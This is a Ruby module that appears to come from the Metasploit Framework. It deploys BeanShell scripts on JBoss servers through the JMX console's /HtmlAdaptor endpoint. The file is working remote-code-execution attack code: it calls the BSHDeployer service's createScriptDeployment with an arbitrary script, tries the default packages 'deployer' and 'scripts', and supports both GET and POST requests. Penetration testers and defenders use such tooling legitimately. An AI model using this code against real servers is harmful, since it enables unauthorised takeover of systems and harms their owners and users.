# -*- coding: binary -*-

module Msf::Exploit::Remote::HTTP::JBoss::BeanShell

  DEFAULT_PACKAGES = %w{ deployer scripts }

  # Deploys a Bean Shell script with a set of JBOSS default packages
  #
  # @param bsh_script [String] The Bean Shell script to deploy
  # @return [String, nil] The package name used to deploy the script, nil otherwise
  def deploy_bsh(bsh_script)
    package = nil

    if datastore['PACKAGE'].blank?
      packages = DEFAULT_PACKAGES
    else
      packages = [ datastore['PACKAGE'] ]
    end

    packages.each do |p|
      if deploy_package(bsh_script, p)
        return p
      end
    end

    package
  end

  # Deploys a Bean Shell script using the specified package
  #
  # @param bsh_script [String] The Bean Shell script to deploy
  # @param package [String] The package used to deploy the script
  # @return [Boolean] `true` if the script gets deployed, `false` otherwise
  def deploy_package(bsh_script, package)
    success = false

    print_status("Attempting to use '#{package}' as package")
    res = invoke_bsh_script(bsh_script, package)

    if res.nil?
      print_error("Unable to deploy WAR [No Response]")
    elsif res.code < 200 || res.code >= 300
      case res.code
      when 401
        print_warning("Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
      else
        print_error("Unable to deploy BSH script [#{res.code} #{res.message}]")
      end
    else
      success = true
    end

    success
  end

  # Invokes a Bean Shell script on the JBoss via BSHDeployer
  #
  # @param bsh_script [String] A Bean Shell script
  # @param package [String] The package used to deploy the script
  # @return [Rex::Proto::Http::Response, nil] The {Rex::Proto::Http::Response} response, nil if timeout
  def invoke_bsh_script(bsh_script, package)
    params =  { }
    params.compare_by_identity
    params['action']     = 'invokeOpByName'
    params['name']       = "jboss.#{package}:service=BSHDeployer"
    params['methodName'] = 'createScriptDeployment'
    params['argType']    = 'java.lang.String'
    params['arg0']       = bsh_script
    params['argType']    = 'java.lang.String'
    params['arg1']       = Rex::Text.rand_text_alphanumeric(8+rand(8)) + '.bsh'

    opts = {
      'method'	=> http_verb,
      'uri'    => normalize_uri(target_uri.path.to_s, '/HtmlAdaptor')
    }

    if http_verb == 'POST'
      opts.merge!('vars_post' => params)
    else
      opts.merge!('vars_get' => params)
    end

    send_request_cgi(opts)
  end

end
